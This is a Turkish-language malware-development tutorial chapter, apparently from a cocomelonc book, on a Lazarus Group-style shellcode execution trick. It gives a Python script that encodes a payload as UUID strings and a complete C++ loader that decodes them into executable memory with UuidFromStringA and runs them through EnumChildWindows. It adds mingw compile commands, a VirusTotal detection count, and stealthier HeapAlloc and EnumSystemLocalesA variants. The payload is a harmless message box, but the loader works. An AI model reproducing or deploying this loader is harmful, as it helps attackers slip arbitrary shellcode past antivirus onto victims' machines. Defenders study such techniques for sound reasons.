\newpage
\subsection{35. Zararlı yazılım geliştirme tüyoları. Lazarus group tarzı shellcode çalıştırma. C++ örneği.}

﷽

![injection](./images/63/2022-07-22_09-57.png){width="80%"}    

Bu yazı, başka bir ilginç numara üzerine yaptığım araştırmaların bir sonucudur: `UuidFromStringA` ve `EnumChildWindows` kullanarak payload çalıştırma.    

### UuidFromStringA

This function converts a string to UUID:

```cpp
RPC_STATUS UuidFromStringA(
  RPC_CSTR StringUuid,
  UUID     *Uuid
);
```
Standard `memcpy` veya `WriteProcessMemory` işlevlerini kullanmadan, bu işlev verileri çözmek ve belleğe yazmak için kullanılabilir.   

Shellcode çalıştırma tekniği şu adımlardan oluşur:     

- Bellek tahsisi (`VirtualAlloc`)       
- `UuidFromStringA` kullanarak UUID dizilerini ikili formata dönüştürüp belleğe kaydetme    
- `EnumChildWindows` (veya `EnumDesktopsA` ya da başka bir aday) kullanarak belleğe yüklenen payload'u yürütme    

### pratik örnek

Hadi, pratik bir örneğe bakalım. Bu numara oldukça basit ve [önceki](https://cocomelonc.github.io/tutorial/2022/06/27/malware-injection-20.html) numaralara benzer, ancak Lazarus Group'a özgü bazı değişiklikler içerir.    

İlk olarak, istediğimiz payload'u UUID geçerli dizelere dönüştürmek için bir betiğe ihtiyacımız var. Örneğin `payload_uuid.py`:     

```python
#!usr/bin/python3

from uuid import UUID
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-p','--payload', required = True, help = "payload: binary file")
args = vars(parser.parse_args())
pbin = args['payload']

with open(pbin, "rb") as f:
    # read in 16 bytes from our input payload
    chunk = f.read(16)
    while chunk:
        # if the chunk is less than 16 bytes then we pad the difference (x90)
        if len(chunk) < 16:
            padding = 16 - len(chunk)
            chunk = chunk + (b"\x90" * padding)
        print(UUID(bytes_le=chunk))
        chunk = f.read(16)
```        

Her zamanki gibi, `meow-meow` mesaj kutusu payload'u (`meow.bin`) kullanacağım.     

Çalıştır:    

```bash
python3 payload_uuid.py -p meow.bin
```
![injection](./images/63/2022-07-22_10-46.png){width="80%"}    

Artık payload'umuzu `UUID` formatında elde ettiğimize göre, aşağıdaki kodu test etmek için bir kavram kanıtı oluşturabiliriz:    

```cpp
#include <windows.h>
#include <rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] = {
  "e48148fc-fff0-ffff-e8d0-000000415141",
  "56515250-3148-65d2-488b-52603e488b52",
  "8b483e18-2052-483e-8b72-503e480fb74a",
  "c9314d4a-3148-acc0-3c61-7c022c2041c1",
  "01410dc9-e2c1-52ed-4151-3e488b52203e",
  "483c428b-d001-8b3e-8088-0000004885c0",
  "01486f74-50d0-8b3e-4818-3e448b402049",
  "5ce3d001-ff48-3ec9-418b-34884801d64d",
  "3148c931-acc0-c141-c90d-4101c138e075",
  "034c3ef1-244c-4508-39d1-75d6583e448b",
  "01492440-66d0-413e-8b0c-483e448b401c",
  "3ed00149-8b41-8804-4801-d0415841585e",
  "58415a59-5941-5a41-4883-ec204152ffe0",
  "5a594158-483e-128b-e949-ffffff5d49c7",
  "000000c1-3e00-8d48-95fe-0000003e4c8d",
  "00010985-4800-c931-41ba-45835607ffd5",
  "41c93148-f0ba-a2b5-56ff-d54d656f772d",
  "776f656d-0021-5e3d-2e2e-5e3d00909090"
};

int main() {
  int elems = sizeof(uuids) / sizeof(uuids[0]);
  VOID* mem = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000,
  PAGE_EXECUTE_READWRITE);
  DWORD_PTR hptr = (DWORD_PTR)mem;
  for (int i = 0; i < elems; i++) {
    // printf("[*] Allocating %d of %d uuids\n", i + 1, elems);
    // printf("%s\n", *(uuids+i));
    RPC_CSTR rcp_cstr = (RPC_CSTR)*(uuids+i);
    RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID*)hptr);
    if (status != RPC_S_OK) {
      printf("[-] UUID convert error\n");
      CloseHandle(mem);
      return -1;
    }
     hptr += 16;
  }

  EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
  // EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
  CloseHandle(mem);
  return 0;
}
```

`UuidFromStringA` işlevine dikkat edin. Daha önce yazdığım gibi, bu API'yi bir UUID işaretçisi yerine bir bellek işaretçisi ile çağırmak, verilen UUID'nin ikili temsilinin bellekte saklanmasına neden olur.  

Birçok API isteğini zincirleyerek ve uygun şekilde tasarlanmış UUID'ler vererek, gerekli içeriği (payload) seçilen bellek bölgesine yüklemek mümkündür.     

Ve ardından, `EnumChildWindows` işlevindeki geri çağırma işlevine işaretçi olarak bu bellek bölgesini belirtiyoruz:     

```cpp
EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
```

veya başka bir işlev `EnumDesktopsA`:    

```cpp
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
```

### demo

Her şeyi eylemde görmek için zararlı kodumuzu derleyelim:     

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive -lrpcrt4
```

![injection](./images/63/2022-07-22_10-56.png){width="80%"}    

ve kurbanın makinesinde çalıştıralım:    

```powershell
.\hack.exe
```

![injection](./images/63/2022-07-22_10-58.png){width="80%"}    

Payload'umuzun gerçekten çalıştığından emin olmak için kodun bir kısmını biraz değiştirebilirsiniz:    

```cpp
printf("[*] Hexdump: ");
for (int i = 0; i < elems*16; i++) {
  printf("%02X ", ((unsigned char*)mem)[i]);
}
```

Daha sonra tekrar derleyin:   

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive -lrpcrt4
```

![injection](./images/63/2022-07-22_11-07.png){width="80%"}    

ve tekrar çalıştırın:   

```powershell
.\hack.exe
```

![injection](./images/63/2022-07-22_11-09.png){width="80%"}    

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)    

Şimdi `hack.exe` dosyamızı VirusTotal'a yükleyelim:    

![injection](./images/63/2022-07-22_14-59.png){width="80%"}    

**Sonuç olarak, 68 antivirüs motorundan 6 tanesi dosyamızı zararlı olarak algıladı.**    

[https://www.virustotal.com/gui/file/003e45e65361b09fd8e372d29fbdecfb3462d9202ddf31bf386c728c9cebafa0/detection](https://www.virustotal.com/gui/file/003e45e65361b09fd8e372d29fbdecfb3462d9202ddf31bf386c728c9cebafa0/detection)    

Bir sorun var. Lazarus Group, `HeapCreate` ve `HeapAlloc` işlevlerini kullanmayı tercih ediyor:     

```cpp
HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
void* mem = HeapAlloc(hc, 0, 0x100000);
```

`HeapAlloc`, yığın belleği tahsis etmek için sık kullanılan bir API çağrısıdır.  
Bu API, bildiğim kadarıyla, `VirtualAlloc` API'si yerine yığından belirli miktarlarda bellek ayırmanıza olanak tanır. Ancak belgelerine göre, gerekirse `HeapAlloc` hala `VirtualAlloc`'u çağırabilir.     

Ayrıca bu API, o kadar şüpheli kabul edilmez.     

Lazarus Group ayrıca payload'u yürütmek için `EnumSystemLocalesA` işlevini kullanır.    

Umarım bu yazı, mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerine ilham olur.      

[nccgroup - RIFT: Analysing a Lazarus Shellcode Execution Method](https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/)      
[Lazarus Group](https://attack.mitre.org/groups/G0032/)    
[Github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-07-21-malware-tricks-22)    
